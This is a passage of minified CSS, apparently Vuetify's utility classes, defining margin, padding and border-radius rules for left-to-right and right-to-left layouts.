.mx-15{margin-right:60px!important;margin-left:60px!important}.v-application .mx-16{margin-right:64px!important;margin-left:64px!important}.v-application .mx-auto{margin-right:auto!important;margin-left:auto!important}.v-application .my-0{margin-top:0!important;margin-bottom:0!important}.v-application .my-1{margin-top:4px!important;margin-bottom:4px!important}.v-application .my-2{margin-top:8px!important;margin-bottom:8px!important}.v-application .my-3{margin-top:12px!important;margin-bottom:12px!important}.v-application .my-4{margin-top:16px!important;margin-bottom:16px!important}.v-application .my-5{margin-top:20px!important;margin-bottom:20px!important}.v-application .my-6{margin-top:24px!important;margin-bottom:24px!important}.v-application .my-7{margin-top:28px!important;margin-bottom:28px!important}.v-application .my-8{margin-top:32px!important;margin-bottom:32px!important}.v-application .my-9{margin-top:36px!important;margin-bottom:36px!important}.v-application .my-10{margin-top:40px!important;margin-bottom:40px!important}.v-application .my-11{margin-top:44px!important;margin-bottom:44px!important}.v-application .my-12{margin-top:48px!important;margin-bottom:48px!important}.v-application .my-13{margin-top:52px!important;margin-bottom:52px!important}.v-application .my-14{margin-top:56px!important;margin-bottom:56px!important}.v-application .my-15{margin-top:60px!important;margin-bottom:60px!important}.v-application .my-16{margin-top:64px!important;margin-bottom:64px!important}.v-application .my-auto{margin-top:auto!important;margin-bottom:auto!important}.v-application .mt-0{margin-top:0!important}.v-application .mt-1{margin-top:4px!important}.v-application .mt-2{margin-top:8px!important}.v-application .mt-3{margin-top:12px!important}.v-application .mt-4{margin-top:16px!important}.v-application .mt-5{margin-top:20px!important}.v-application .mt-6{margin-top:24px!important}.v-application .mt-7{margin-top:28px!important}.v-application .mt-8{margin-top:32px!important}.v-application .mt-9{margin-top:36px!important}.v-application .mt-10{margin-top:40px!important}.v-application .mt-11{margin-top:44px!important}.v-application .mt-12{margin-top:48px!important}.v-application .mt-13{margin-top:52px!important}.v-application .mt-14{margin-top:56px!important}.v-application .mt-15{margin-top:60px!important}.v-application .mt-16{margin-top:64px!important}.v-application .mt-auto{margin-top:auto!important}.v-application .mr-0{margin-right:0!important}.v-application .mr-1{margin-right:4px!important}.v-application .mr-2{margin-right:8px!important}.v-application .mr-3{margin-right:12px!important}.v-application .mr-4{margin-right:16px!important}.v-application .mr-5{margin-right:20px!important}.v-application .mr-6{margin-right:24px!important}.v-application .mr-7{margin-right:28px!important}.v-application .mr-8{margin-right:32px!important}.v-application .mr-9{margin-right:36px!important}.v-application .mr-10{margin-right:40px!important}.v-application .mr-11{margin-right:44px!important}.v-application .mr-12{margin-right:48px!important}.v-application .mr-13{margin-right:52px!important}.v-application .mr-14{margin-right:56px!important}.v-application .mr-15{margin-right:60px!important}.v-application .mr-16{margin-right:64px!important}.v-application .mr-auto{margin-right:auto!important}.v-application .mb-0{margin-bottom:0!important}.v-application .mb-1{margin-bottom:4px!important}.v-application .mb-2{margin-bottom:8px!important}.v-application .mb-3{margin-bottom:12px!important}.v-application .mb-4{margin-bottom:16px!important}.v-application .mb-5{margin-bottom:20px!important}.v-application .mb-6{margin-bottom:24px!important}.v-application .mb-7{margin-bottom:28px!important}.v-application .mb-8{margin-bottom:32px!important}.v-application .mb-9{margin-bottom:36px!important}.v-application .mb-10{margin-bottom:40px!important}.v-application .mb-11{margin-bottom:44px!important}.v-application .mb-12{margin-bottom:48px!important}.v-application .mb-13{margin-bottom:52px!important}.v-application .mb-14{margin-bottom:56px!important}.v-application .mb-15{margin-bottom:60px!important}.v-application .mb-16{margin-bottom:64px!important}.v-application .mb-auto{margin-bottom:auto!important}.v-application .ml-0{margin-left:0!important}.v-application .ml-1{margin-left:4px!important}.v-application .ml-2{margin-left:8px!important}.v-application .ml-3{margin-left:12px!important}.v-application .ml-4{margin-left:16px!important}.v-application .ml-5{margin-left:20px!important}.v-application .ml-6{margin-left:24px!important}.v-application .ml-7{margin-left:28px!important}.v-application .ml-8{margin-left:32px!important}.v-application .ml-9{margin-left:36px!important}.v-application .ml-10{margin-left:40px!important}.v-application .ml-11{margin-left:44px!important}.v-application .ml-12{margin-left:48px!important}.v-application .ml-13{margin-left:52px!important}.v-application .ml-14{margin-left:56px!important}.v-application .ml-15{margin-left:60px!important}.v-application .ml-16{margin-left:64px!important}.v-application .ml-auto{margin-left:auto!important}.v-application--is-ltr .ms-0{margin-left:0!important}.v-application--is-rtl .ms-0{margin-right:0!important}.v-application--is-ltr .ms-1{margin-left:4px!important}.v-application--is-rtl .ms-1{margin-right:4px!important}.v-application--is-ltr .ms-2{margin-left:8px!important}.v-application--is-rtl .ms-2{margin-right:8px!important}.v-application--is-ltr .ms-3{margin-left:12px!important}.v-application--is-rtl .ms-3{margin-right:12px!important}.v-application--is-ltr .ms-4{margin-left:16px!important}.v-application--is-rtl .ms-4{margin-right:16px!important}.v-application--is-ltr .ms-5{margin-left:20px!important}.v-application--is-rtl .ms-5{margin-right:20px!important}.v-application--is-ltr .ms-6{margin-left:24px!important}.v-application--is-rtl .ms-6{margin-right:24px!important}.v-application--is-ltr .ms-7{margin-left:28px!important}.v-application--is-rtl .ms-7{margin-right:28px!important}.v-application--is-ltr .ms-8{margin-left:32px!important}.v-application--is-rtl .ms-8{margin-right:32px!important}.v-application--is-ltr .ms-9{margin-left:36px!important}.v-application--is-rtl .ms-9{margin-right:36px!important}.v-application--is-ltr .ms-10{margin-left:40px!important}.v-application--is-rtl .ms-10{margin-right:40px!important}.v-application--is-ltr .ms-11{margin-left:44px!important}.v-application--is-rtl .ms-11{margin-right:44px!important}.v-application--is-ltr .ms-12{margin-left:48px!important}.v-application--is-rtl .ms-12{margin-right:48px!important}.v-application--is-ltr .ms-13{margin-left:52px!important}.v-application--is-rtl .ms-13{margin-right:52px!important}.v-application--is-ltr .ms-14{margin-left:56px!important}.v-application--is-rtl .ms-14{margin-right:56px!important}.v-application--is-ltr .ms-15{margin-left:60px!important}.v-application--is-rtl .ms-15{margin-right:60px!important}.v-application--is-ltr .ms-16{margin-left:64px!important}.v-application--is-rtl .ms-16{margin-right:64px!important}.v-application--is-ltr .ms-auto{margin-left:auto!important}.v-application--is-rtl .ms-auto{margin-right:auto!important}.v-application--is-ltr .me-0{margin-right:0!important}.v-application--is-rtl .me-0{margin-left:0!important}.v-application--is-ltr .me-1{margin-right:4px!important}.v-application--is-rtl .me-1{margin-left:4px!important}.v-application--is-ltr .me-2{margin-right:8px!important}.v-application--is-rtl .me-2{margin-left:8px!important}.v-application--is-ltr .me-3{margin-right:12px!important}.v-application--is-rtl .me-3{margin-left:12px!important}.v-application--is-ltr .me-4{margin-right:16px!important}.v-application--is-rtl .me-4{margin-left:16px!important}.v-application--is-ltr .me-5{margin-right:20px!important}.v-application--is-rtl .me-5{margin-left:20px!important}.v-application--is-ltr .me-6{margin-right:24px!important}.v-application--is-rtl .me-6{margin-left:24px!important}.v-application--is-ltr .me-7{margin-right:28px!important}.v-application--is-rtl .me-7{margin-left:28px!important}.v-application--is-ltr .me-8{margin-right:32px!important}.v-application--is-rtl .me-8{margin-left:32px!important}.v-application--is-ltr .me-9{margin-right:36px!important}.v-application--is-rtl .me-9{margin-left:36px!important}.v-application--is-ltr .me-10{margin-right:40px!important}.v-application--is-rtl .me-10{margin-left:40px!important}.v-application--is-ltr .me-11{margin-right:44px!important}.v-application--is-rtl .me-11{margin-left:44px!important}.v-application--is-ltr .me-12{margin-right:48px!important}.v-application--is-rtl .me-12{margin-left:48px!important}.v-application--is-ltr .me-13{margin-right:52px!important}.v-application--is-rtl .me-13{margin-left:52px!important}.v-application--is-ltr .me-14{margin-right:56px!important}.v-application--is-rtl .me-14{margin-left:56px!important}.v-application--is-ltr .me-15{margin-right:60px!important}.v-application--is-rtl .me-15{margin-left:60px!important}.v-application--is-ltr .me-16{margin-right:64px!important}.v-application--is-rtl .me-16{margin-left:64px!important}.v-application--is-ltr .me-auto{margin-right:auto!important}.v-application--is-rtl .me-auto{margin-left:auto!important}.v-application .ma-n1{margin:-4px!important}.v-application .ma-n2{margin:-8px!important}.v-application .ma-n3{margin:-12px!important}.v-application .ma-n4{margin:-16px!important}.v-application .ma-n5{margin:-20px!important}.v-application .ma-n6{margin:-24px!important}.v-application .ma-n7{margin:-28px!important}.v-application .ma-n8{margin:-32px!important}.v-application .ma-n9{margin:-36px!important}.v-application .ma-n10{margin:-40px!important}.v-application .ma-n11{margin:-44px!important}.v-application .ma-n12{margin:-48px!important}.v-application .ma-n13{margin:-52px!important}.v-application .ma-n14{margin:-56px!important}.v-application .ma-n15{margin:-60px!important}.v-application .ma-n16{margin:-64px!important}.v-application .mx-n1{margin-right:-4px!important;margin-left:-4px!important}.v-application .mx-n2{margin-right:-8px!important;margin-left:-8px!important}.v-application .mx-n3{margin-right:-12px!important;margin-left:-12px!important}.v-application .mx-n4{margin-right:-16px!important;margin-left:-16px!important}.v-application .mx-n5{margin-right:-20px!important;margin-left:-20px!important}.v-application .mx-n6{margin-right:-24px!important;margin-left:-24px!important}.v-application .mx-n7{margin-right:-28px!important;margin-left:-28px!important}.v-application .mx-n8{margin-right:-32px!important;margin-left:-32px!important}.v-application .mx-n9{margin-right:-36px!important;margin-left:-36px!important}.v-application .mx-n10{margin-right:-40px!important;margin-left:-40px!important}.v-application .mx-n11{margin-right:-44px!important;margin-left:-44px!important}.v-application .mx-n12{margin-right:-48px!important;margin-left:-48px!important}.v-application .mx-n13{margin-right:-52px!important;margin-left:-52px!important}.v-application .mx-n14{margin-right:-56px!important;margin-left:-56px!important}.v-application .mx-n15{margin-right:-60px!important;margin-left:-60px!important}.v-application .mx-n16{margin-right:-64px!important;margin-left:-64px!important}.v-application .my-n1{margin-top:-4px!important;margin-bottom:-4px!important}.v-application .my-n2{margin-top:-8px!important;margin-bottom:-8px!important}.v-application .my-n3{margin-top:-12px!important;margin-bottom:-12px!important}.v-application .my-n4{margin-top:-16px!important;margin-bottom:-16px!important}.v-application .my-n5{margin-top:-20px!important;margin-bottom:-20px!important}.v-application .my-n6{margin-top:-24px!important;margin-bottom:-24px!important}.v-application .my-n7{margin-top:-28px!important;margin-bottom:-28px!important}.v-application .my-n8{margin-top:-32px!important;margin-bottom:-32px!important}.v-application .my-n9{margin-top:-36px!important;margin-bottom:-36px!important}.v-application .my-n10{margin-top:-40px!important;margin-bottom:-40px!important}.v-application .my-n11{margin-top:-44px!important;margin-bottom:-44px!important}.v-application .my-n12{margin-top:-48px!important;margin-bottom:-48px!important}.v-application .my-n13{margin-top:-52px!important;margin-bottom:-52px!important}.v-application .my-n14{margin-top:-56px!important;margin-bottom:-56px!important}.v-application .my-n15{margin-top:-60px!important;margin-bottom:-60px!important}.v-application .my-n16{margin-top:-64px!important;margin-bottom:-64px!important}.v-application .mt-n1{margin-top:-4px!important}.v-application .mt-n2{margin-top:-8px!important}.v-application .mt-n3{margin-top:-12px!important}.v-application .mt-n4{margin-top:-16px!important}.v-application .mt-n5{margin-top:-20px!important}.v-application .mt-n6{margin-top:-24px!important}.v-application .mt-n7{margin-top:-28px!important}.v-application .mt-n8{margin-top:-32px!important}.v-application .mt-n9{margin-top:-36px!important}.v-application .mt-n10{margin-top:-40px!important}.v-application .mt-n11{margin-top:-44px!important}.v-application .mt-n12{margin-top:-48px!important}.v-application .mt-n13{margin-top:-52px!important}.v-application .mt-n14{margin-top:-56px!important}.v-application .mt-n15{margin-top:-60px!important}.v-application .mt-n16{margin-top:-64px!important}.v-application .mr-n1{margin-right:-4px!important}.v-application .mr-n2{margin-right:-8px!important}.v-application .mr-n3{margin-right:-12px!important}.v-application .mr-n4{margin-right:-16px!important}.v-application .mr-n5{margin-right:-20px!important}.v-application .mr-n6{margin-right:-24px!important}.v-application .mr-n7{margin-right:-28px!important}.v-application .mr-n8{margin-right:-32px!important}.v-application .mr-n9{margin-right:-36px!important}.v-application .mr-n10{margin-right:-40px!important}.v-application .mr-n11{margin-right:-44px!important}.v-application .mr-n12{margin-right:-48px!important}.v-application .mr-n13{margin-right:-52px!important}.v-application .mr-n14{margin-right:-56px!important}.v-application .mr-n15{margin-right:-60px!important}.v-application .mr-n16{margin-right:-64px!important}.v-application .mb-n1{margin-bottom:-4px!important}.v-application .mb-n2{margin-bottom:-8px!important}.v-application .mb-n3{margin-bottom:-12px!important}.v-application .mb-n4{margin-bottom:-16px!important}.v-application .mb-n5{margin-bottom:-20px!important}.v-application .mb-n6{margin-bottom:-24px!important}.v-application .mb-n7{margin-bottom:-28px!important}.v-application .mb-n8{margin-bottom:-32px!important}.v-application .mb-n9{margin-bottom:-36px!important}.v-application .mb-n10{margin-bottom:-40px!important}.v-application .mb-n11{margin-bottom:-44px!important}.v-application .mb-n12{margin-bottom:-48px!important}.v-application .mb-n13{margin-bottom:-52px!important}.v-application .mb-n14{margin-bottom:-56px!important}.v-application .mb-n15{margin-bottom:-60px!important}.v-application .mb-n16{margin-bottom:-64px!important}.v-application .ml-n1{margin-left:-4px!important}.v-application .ml-n2{margin-left:-8px!important}.v-application .ml-n3{margin-left:-12px!important}.v-application .ml-n4{margin-left:-16px!important}.v-application .ml-n5{margin-left:-20px!important}.v-application .ml-n6{margin-left:-24px!important}.v-application .ml-n7{margin-left:-28px!important}.v-application .ml-n8{margin-left:-32px!important}.v-application .ml-n9{margin-left:-36px!important}.v-application .ml-n10{margin-left:-40px!important}.v-application .ml-n11{margin-left:-44px!important}.v-application .ml-n12{margin-left:-48px!important}.v-application .ml-n13{margin-left:-52px!important}.v-application .ml-n14{margin-left:-56px!important}.v-application .ml-n15{margin-left:-60px!important}.v-application .ml-n16{margin-left:-64px!important}.v-application--is-ltr .ms-n1{margin-left:-4px!important}.v-application--is-rtl .ms-n1{margin-right:-4px!important}.v-application--is-ltr .ms-n2{margin-left:-8px!important}.v-application--is-rtl .ms-n2{margin-right:-8px!important}.v-application--is-ltr .ms-n3{margin-left:-12px!important}.v-application--is-rtl .ms-n3{margin-right:-12px!important}.v-application--is-ltr .ms-n4{margin-left:-16px!important}.v-application--is-rtl .ms-n4{margin-right:-16px!important}.v-application--is-ltr .ms-n5{margin-left:-20px!important}.v-application--is-rtl .ms-n5{margin-right:-20px!important}.v-application--is-ltr .ms-n6{margin-left:-24px!important}.v-application--is-rtl .ms-n6{margin-right:-24px!important}.v-application--is-ltr .ms-n7{margin-left:-28px!important}.v-application--is-rtl .ms-n7{margin-right:-28px!important}.v-application--is-ltr .ms-n8{margin-left:-32px!important}.v-application--is-rtl .ms-n8{margin-right:-32px!important}.v-application--is-ltr .ms-n9{margin-left:-36px!important}.v-application--is-rtl .ms-n9{margin-right:-36px!important}.v-application--is-ltr .ms-n10{margin-left:-40px!important}.v-application--is-rtl .ms-n10{margin-right:-40px!important}.v-application--is-ltr .ms-n11{margin-left:-44px!important}.v-application--is-rtl .ms-n11{margin-right:-44px!important}.v-application--is-ltr .ms-n12{margin-left:-48px!important}.v-application--is-rtl .ms-n12{margin-right:-48px!important}.v-application--is-ltr .ms-n13{margin-left:-52px!important}.v-application--is-rtl .ms-n13{margin-right:-52px!important}.v-application--is-ltr .ms-n14{margin-left:-56px!important}.v-application--is-rtl .ms-n14{margin-right:-56px!important}.v-application--is-ltr .ms-n15{margin-left:-60px!important}.v-application--is-rtl .ms-n15{margin-right:-60px!important}.v-application--is-ltr .ms-n16{margin-left:-64px!important}.v-application--is-rtl .ms-n16{margin-right:-64px!important}.v-application--is-ltr .me-n1{margin-right:-4px!important}.v-application--is-rtl .me-n1{margin-left:-4px!important}.v-application--is-ltr .me-n2{margin-right:-8px!important}.v-application--is-rtl .me-n2{margin-left:-8px!important}.v-application--is-ltr .me-n3{margin-right:-12px!important}.v-application--is-rtl .me-n3{margin-left:-12px!important}.v-application--is-ltr .me-n4{margin-right:-16px!important}.v-application--is-rtl .me-n4{margin-left:-16px!important}.v-application--is-ltr .me-n5{margin-right:-20px!important}.v-application--is-rtl .me-n5{margin-left:-20px!important}.v-application--is-ltr .me-n6{margin-right:-24px!important}.v-application--is-rtl .me-n6{margin-left:-24px!important}.v-application--is-ltr .me-n7{margin-right:-28px!important}.v-application--is-rtl .me-n7{margin-left:-28px!important}.v-application--is-ltr .me-n8{margin-right:-32px!important}.v-application--is-rtl .me-n8{margin-left:-32px!important}.v-application--is-ltr .me-n9{margin-right:-36px!important}.v-application--is-rtl .me-n9{margin-left:-36px!important}.v-application--is-ltr .me-n10{margin-right:-40px!important}.v-application--is-rtl .me-n10{margin-left:-40px!important}.v-application--is-ltr .me-n11{margin-right:-44px!important}.v-application--is-rtl .me-n11{margin-left:-44px!important}.v-application--is-ltr .me-n12{margin-right:-48px!important}.v-application--is-rtl .me-n12{margin-left:-48px!important}.v-application--is-ltr .me-n13{margin-right:-52px!important}.v-application--is-rtl .me-n13{margin-left:-52px!important}.v-application--is-ltr .me-n14{margin-right:-56px!important}.v-application--is-rtl .me-n14{margin-left:-56px!important}.v-application--is-ltr .me-n15{margin-right:-60px!important}.v-application--is-rtl .me-n15{margin-left:-60px!important}.v-application--is-ltr .me-n16{margin-right:-64px!important}.v-application--is-rtl .me-n16{margin-left:-64px!important}.v-application .pa-0{padding:0!important}.v-application .pa-1{padding:4px!important}.v-application .pa-2{padding:8px!important}.v-application .pa-3{padding:12px!important}.v-application .pa-4{padding:16px!important}.v-application .pa-5{padding:20px!important}.v-application .pa-6{padding:24px!important}.v-application .pa-7{padding:28px!important}.v-application .pa-8{padding:32px!important}.v-application .pa-9{padding:36px!important}.v-application .pa-10{padding:40px!important}.v-application .pa-11{padding:44px!important}.v-application .pa-12{padding:48px!important}.v-application .pa-13{padding:52px!important}.v-application .pa-14{padding:56px!important}.v-application .pa-15{padding:60px!important}.v-application .pa-16{padding:64px!important}.v-application .px-0{padding-right:0!important;padding-left:0!important}.v-application .px-1{padding-right:4px!important;padding-left:4px!important}.v-application .px-2{padding-right:8px!important;padding-left:8px!important}.v-application .px-3{padding-right:12px!important;padding-left:12px!important}.v-application .px-4{padding-right:16px!important;padding-left:16px!important}.v-application .px-5{padding-right:20px!important;padding-left:20px!important}.v-application .px-6{padding-right:24px!important;padding-left:24px!important}.v-application .px-7{padding-right:28px!important;padding-left:28px!important}.v-application .px-8{padding-right:32px!important;padding-left:32px!important}.v-application .px-9{padding-right:36px!important;padding-left:36px!important}.v-application .px-10{padding-right:40px!important;padding-left:40px!important}.v-application .px-11{padding-right:44px!important;padding-left:44px!important}.v-application .px-12{padding-right:48px!important;padding-left:48px!important}.v-application .px-13{padding-right:52px!important;padding-left:52px!important}.v-application .px-14{padding-right:56px!important;padding-left:56px!important}.v-application .px-15{padding-right:60px!important;padding-left:60px!important}.v-application .px-16{padding-right:64px!important;padding-left:64px!important}.v-application .py-0{padding-top:0!important;padding-bottom:0!important}.v-application .py-1{padding-top:4px!important;padding-bottom:4px!important}.v-application .py-2{padding-top:8px!important;padding-bottom:8px!important}.v-application .py-3{padding-top:12px!important;padding-bottom:12px!important}.v-application .py-4{padding-top:16px!important;padding-bottom:16px!important}.v-application .py-5{padding-top:20px!important;padding-bottom:20px!important}.v-application .py-6{padding-top:24px!important;padding-bottom:24px!important}.v-application .py-7{padding-top:28px!important;padding-bottom:28px!important}.v-application .py-8{padding-top:32px!important;padding-bottom:32px!important}.v-application .py-9{padding-top:36px!important;padding-bottom:36px!important}.v-application .py-10{padding-top:40px!important;padding-bottom:40px!important}.v-application .py-11{padding-top:44px!important;padding-bottom:44px!important}.v-application .py-12{padding-top:48px!important;padding-bottom:48px!important}.v-application .py-13{padding-top:52px!important;padding-bottom:52px!important}.v-application .py-14{padding-top:56px!important;padding-bottom:56px!important}.v-application .py-15{padding-top:60px!important;padding-bottom:60px!important}.v-application .py-16{padding-top:64px!important;padding-bottom:64px!important}.v-application .pt-0{padding-top:0!important}.v-application .pt-1{padding-top:4px!important}.v-application .pt-2{padding-top:8px!important}.v-application .pt-3{padding-top:12px!important}.v-application .pt-4{padding-top:16px!important}.v-application .pt-5{padding-top:20px!important}.v-application .pt-6{padding-top:24px!important}.v-application .pt-7{padding-top:28px!important}.v-application .pt-8{padding-top:32px!important}.v-application .pt-9{padding-top:36px!important}.v-application .pt-10{padding-top:40px!important}.v-application .pt-11{padding-top:44px!important}.v-application .pt-12{padding-top:48px!important}.v-application .pt-13{padding-top:52px!important}.v-application .pt-14{padding-top:56px!important}.v-application .pt-15{padding-top:60px!important}.v-application .pt-16{padding-top:64px!important}.v-application .pr-0{padding-right:0!important}.v-application .pr-1{padding-right:4px!important}.v-application .pr-2{padding-right:8px!important}.v-application .pr-3{padding-right:12px!important}.v-application .pr-4{padding-right:16px!important}.v-application .pr-5{padding-right:20px!important}.v-application .pr-6{padding-right:24px!important}.v-application .pr-7{padding-right:28px!important}.v-application .pr-8{padding-right:32px!important}.v-application .pr-9{padding-right:36px!important}.v-application .pr-10{padding-right:40px!important}.v-application .pr-11{padding-right:44px!important}.v-application .pr-12{padding-right:48px!important}.v-application .pr-13{padding-right:52px!important}.v-application .pr-14{padding-right:56px!important}.v-application .pr-15{padding-right:60px!important}.v-application .pr-16{padding-right:64px!important}.v-application .pb-0{padding-bottom:0!important}.v-application .pb-1{padding-bottom:4px!important}.v-application .pb-2{padding-bottom:8px!important}.v-application .pb-3{padding-bottom:12px!important}.v-application .pb-4{padding-bottom:16px!important}.v-application .pb-5{padding-bottom:20px!important}.v-application .pb-6{padding-bottom:24px!important}.v-application .pb-7{padding-bottom:28px!important}.v-application .pb-8{padding-bottom:32px!important}.v-application .pb-9{padding-bottom:36px!important}.v-application .pb-10{padding-bottom:40px!important}.v-application .pb-11{padding-bottom:44px!important}.v-application .pb-12{padding-bottom:48px!important}.v-application .pb-13{padding-bottom:52px!important}.v-application .pb-14{padding-bottom:56px!important}.v-application .pb-15{padding-bottom:60px!important}.v-application .pb-16{padding-bottom:64px!important}.v-application .pl-0{padding-left:0!important}.v-application .pl-1{padding-left:4px!important}.v-application .pl-2{padding-left:8px!important}.v-application .pl-3{padding-left:12px!important}.v-application .pl-4{padding-left:16px!important}.v-application .pl-5{padding-left:20px!important}.v-application .pl-6{padding-left:24px!important}.v-application .pl-7{padding-left:28px!important}.v-application .pl-8{padding-left:32px!important}.v-application .pl-9{padding-left:36px!important}.v-application .pl-10{padding-left:40px!important}.v-application .pl-11{padding-left:44px!important}.v-application .pl-12{padding-left:48px!important}.v-application .pl-13{padding-left:52px!important}.v-application .pl-14{padding-left:56px!important}.v-application .pl-15{padding-left:60px!important}.v-application .pl-16{padding-left:64px!important}.v-application--is-ltr .ps-0{padding-left:0!important}.v-application--is-rtl .ps-0{padding-right:0!important}.v-application--is-ltr .ps-1{padding-left:4px!important}.v-application--is-rtl .ps-1{padding-right:4px!important}.v-application--is-ltr .ps-2{padding-left:8px!important}.v-application--is-rtl .ps-2{padding-right:8px!important}.v-application--is-ltr .ps-3{padding-left:12px!important}.v-application--is-rtl .ps-3{padding-right:12px!important}.v-application--is-ltr .ps-4{padding-left:16px!important}.v-application--is-rtl .ps-4{padding-right:16px!important}.v-application--is-ltr .ps-5{padding-left:20px!important}.v-application--is-rtl .ps-5{padding-right:20px!important}.v-application--is-ltr .ps-6{padding-left:24px!important}.v-application--is-rtl .ps-6{padding-right:24px!important}.v-application--is-ltr .ps-7{padding-left:28px!important}.v-application--is-rtl .ps-7{padding-right:28px!important}.v-application--is-ltr .ps-8{padding-left:32px!important}.v-application--is-rtl .ps-8{padding-right:32px!important}.v-application--is-ltr .ps-9{padding-left:36px!important}.v-application--is-rtl .ps-9{padding-right:36px!important}.v-application--is-ltr .ps-10{padding-left:40px!important}.v-application--is-rtl .ps-10{padding-right:40px!important}.v-application--is-ltr .ps-11{padding-left:44px!important}.v-application--is-rtl .ps-11{padding-right:44px!important}.v-application--is-ltr .ps-12{padding-left:48px!important}.v-application--is-rtl .ps-12{padding-right:48px!important}.v-application--is-ltr .ps-13{padding-left:52px!important}.v-application--is-rtl .ps-13{padding-right:52px!important}.v-application--is-ltr .ps-14{padding-left:56px!important}.v-application--is-rtl .ps-14{padding-right:56px!important}.v-application--is-ltr .ps-15{padding-left:60px!important}.v-application--is-rtl .ps-15{padding-right:60px!important}.v-application--is-ltr .ps-16{padding-left:64px!important}.v-application--is-rtl .ps-16{padding-right:64px!important}.v-application--is-ltr .pe-0{padding-right:0!important}.v-application--is-rtl .pe-0{padding-left:0!important}.v-application--is-ltr .pe-1{padding-right:4px!important}.v-application--is-rtl .pe-1{padding-left:4px!important}.v-application--is-ltr .pe-2{padding-right:8px!important}.v-application--is-rtl .pe-2{padding-left:8px!important}.v-application--is-ltr .pe-3{padding-right:12px!important}.v-application--is-rtl .pe-3{padding-left:12px!important}.v-application--is-ltr .pe-4{padding-right:16px!important}.v-application--is-rtl .pe-4{padding-left:16px!important}.v-application--is-ltr .pe-5{padding-right:20px!important}.v-application--is-rtl .pe-5{padding-left:20px!important}.v-application--is-ltr .pe-6{padding-right:24px!important}.v-application--is-rtl .pe-6{padding-left:24px!important}.v-application--is-ltr .pe-7{padding-right:28px!important}.v-application--is-rtl .pe-7{padding-left:28px!important}.v-application--is-ltr .pe-8{padding-right:32px!important}.v-application--is-rtl .pe-8{padding-left:32px!important}.v-application--is-ltr .pe-9{padding-right:36px!important}.v-application--is-rtl .pe-9{padding-left:36px!important}.v-application--is-ltr .pe-10{padding-right:40px!important}.v-application--is-rtl .pe-10{padding-left:40px!important}.v-application--is-ltr .pe-11{padding-right:44px!important}.v-application--is-rtl .pe-11{padding-left:44px!important}.v-application--is-ltr .pe-12{padding-right:48px!important}.v-application--is-rtl .pe-12{padding-left:48px!important}.v-application--is-ltr .pe-13{padding-right:52px!important}.v-application--is-rtl .pe-13{padding-left:52px!important}.v-application--is-ltr .pe-14{padding-right:56px!important}.v-application--is-rtl .pe-14{padding-left:56px!important}.v-application--is-ltr .pe-15{padding-right:60px!important}.v-application--is-rtl .pe-15{padding-left:60px!important}.v-application--is-ltr .pe-16{padding-right:64px!important}.v-application--is-rtl .pe-16{padding-left:64px!important}.v-application .rounded-0{border-radius:0!important}.v-application .rounded-sm{border-radius:2px!important}.v-application .rounded{border-radius:4px!important}.v-application .rounded-lg{border-radius:8px!important}.v-application .rounded-xl{border-radius:24px!important}.v-application .rounded-pill{border-radius:9999px!important}.v-application .rounded-circle{border-radius:50%!important}.v-application .rounded-t-0{border-top-left-radius:0!important;border-top-right-radius:0!important}.v-application .rounded-t-sm{border-top-left-radius:2px!important;border-top-right-radius:2px!important}.v-application .rounded-t{border-top-left-radius:4px!important;border-top-right-radius:4px!important}.v-application .rounded-t-lg{border-top-left-radius:8px!important;border-top-right-radius:8px!important}.v-application .rounded-t-xl{border-top-left-radius:24px!important;border-top-right-radius:24px!important}.v-application .rounded-t-pill{border-top-left-radius:9999px!important;border-top-right-radius:9999px!important}.v-application .rounded-t-circle{border-top-left-radius:50%!important;border-top-right-radius:50%!important}.v-application .rounded-r-0{border-top-right-radius:0!important;border-bottom-right-radius:0!important}.v-application .rounded-r-sm{border-top-right-radius:2px!important;border-bottom-right-radius:2px!important}.v-application .rounded-r{border-top-right-radius:4px!important;border-bottom-right-radius:4px!important}.v-application .rounded-r-lg{border-top-right-radius:8px!important;border-bottom-right-radius:8px!important}.v-application .rounded-r-xl{border-top-right-radius:24px!important;border-bottom-right-radius:24px!important}.v-application .rounded-r-pill{border-top-right-radius:9999px!important;border-bottom-right-radius:9999px!important}.v-application .rounded-r-circle{border-top-right-radius:50%!important;border-bottom-right-radius:50%!important}.v-application .rounded-b-0{border-bottom-left-radius:0!important;border-bottom-right-radius:0!important}.v-application .rounded-b-sm{border-bottom-left-radius:2px!important;border-bottom-right-radius:2px!important}.v-application .rounded-b{border-bottom-left-radius:4px!important;border-bottom-right-radius:4px!important}.v-application .rounded-b-lg{border-bottom-left-radius:8px!important;border-bottom-right-radius:8px!important}.v-application .rounded-b-xl{border-bottom-left-radius:24px!important;border-bottom-right-radius:24px!important}.v-application .rounded-b-pill{border-bottom-left-radius:9999px!important;border-bottom-right-radius:9999px!important}.v-application .rounded-b-circle{border-bottom-left-radius:50%!important;border-bottom-right-radius:50%!important}.v-application .rounded-l-0{border-top-left-radius:0!important;border-bottom-left-radius:0!important}.v-application .rounded-l-sm{border-top-left-radius:2px!important;border-bottom-left-radius:2px!important}.v-application .rounded-l{border-top-left-radius:4px!important;border-bottom-left-radius:4px!important}.v-application .rounded-l-lg{border-top-left-radius:8px!important;border-bottom-left-radius:8px!important}.v-application .rounded-l-xl{border-top-left-radius:24px!important;border-bottom-left-radius:24px!important}.v-application .rounded-l-pill{border-top-left-radius:9999px!important;border-bottom-left-radius:9999px!important}.v-application .rounded-l-circle{border-top-left-radius:50%!important;border-bottom-left-radius:50%!important}.v-application .rounded-tl-0{border-top-left-radius:0!important}.v-application .rounded-tl-sm{border-top-left-radius:2px!important}.v-application .rounded-tl{border-top-left-radius:4px!important}.v-application .rounded-tl-lg{border-top-left-radius:8px!important}.v-application .rounded-tl-xl{border-top-left-radius:24px!important}.v-application .rounded-tl-pill{border-top-left-radius:9999px!important}.v-application .rounded-tl-circle{border-top-left-radius:50%!important}.v-application .rounded-tr-0{border-top-right-radius:0!important}.v-application .rounded-tr-sm{border-top-right-radius:2px!important}.v-application .rounded-tr{border-top-right-radius:4px!important}.v-application .rounded-tr-lg{border-top-right-radius:8px!important}.v-application .rounded-tr-xl{border-top-right-radius:24px!important}.v-application .rounded-tr-pill{border-top-right-radius:9999px!important}.v-application .rounded-tr-circle{border-top-right-radius:50%!important}.v-application .rounded-br-0{border-bottom-right-radius:0!important}.v-application .rounded-br-sm{border-bottom-right-radius:2px!important}.v-application .rounded-br{border-bottom-right-radius:4px!important}.v-application .rounded-br-lg{border-bottom-right-radius:8px!important}.v-application .rounded-br-xl{border-bottom-right-radius:24px!important}.v-application .rounded-br-pill{border-bottom-right-radius:9999px!important}.v-application .rounded-br-circle{border-bottom-right-radius:50%!important}.v-application 